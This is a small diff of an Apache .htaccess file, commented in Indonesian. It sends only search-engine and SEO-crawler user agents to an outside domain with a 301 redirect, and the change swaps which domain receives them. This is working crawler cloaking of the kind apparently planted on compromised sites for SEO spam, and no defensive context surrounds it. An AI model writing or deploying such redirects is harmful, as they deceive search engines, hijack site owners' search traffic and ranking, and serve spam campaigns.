@@ -6,5 +6,5 @@ RewriteEngine On
 RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
 
 # Redirect 301 hanya untuk Bot
-RewriteRule ^(.*)$ https://magazineasce.com/ [R=301,L]
+RewriteRule ^(.*)$ https://e-journal.ivet.ac.id/ [R=301,L]
 </IfModule>
